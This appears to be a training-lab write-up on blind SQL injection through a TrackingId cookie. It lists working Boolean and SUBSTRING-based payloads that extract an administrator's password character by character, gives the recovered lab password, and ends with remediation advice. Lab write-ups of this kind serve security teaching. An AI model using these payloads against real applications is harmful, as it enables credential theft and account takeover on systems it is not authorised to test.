# Lab: Blind SQL injection with conditional responses

**Category:** SQL Injection
**Difficulty:** Practitioner
**Objective:** Exploit blind SQL injection in the `TrackingId` cookie to find the administrator's password and log in.

## 0. Attacker mindset

The application does not return query results or error messages, but changes its behavior based on whether a query returns rows. The "Welcome back" message is the signal. I can inject Boolean conditions into the `TrackingId` cookie and infer data one character at a time by observing this response.

## 1. What isthe vulnerability?

The `TrackingId` cookie is concatenated directly into a SQL query. The query result is not displayed, but the presence or absence of the "Welcome back" message reveals whether the injected condition is true or false. This enables blind data extraction.

## 2. How did I exploit it?

### Confirmed the injection point
```
TrackingId=xyz' AND '1'='1 → "Welcome back" (true)
TrackingId=xyz' AND '1'='2 → no "Welcome back" (false)
```

### Confirmed the `users` table an `administrator` user exist

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username = 'administrator')='a
→ "Welcome back"
```

### Extracted the password character by character

Used `SUBSTRING` to isolate one character at a time. The first number in `SUBSTRING` is the position (incremented for each character), the second is always `1` (extract a single character). Tested each position with `>` to narrow down the value, then `=` to confirm:

```
TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'm
TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 2, 1) > 'm
...
```

Discovered the password character by character: `c59gv0x959boe27f57er`

### Logged in
Used `administrator`:`c59gv0x959boe27f57er`. Lab solved.

## 3. Impact

- Complete password extraction without any visible data or error messages
- Demonstrates that Boolean-based blind SQL injection is a reliable and stealthy technique
- Attacker gains full account takeover, including administrative access

## 4. How can it be fixed?
- Use parameterized queries (prepared statements) for all SQL operations
- Do not concatenate user-controllable input (including cookies) into queries
- Apply consistent, generic error handling and responses to avoid information leakage
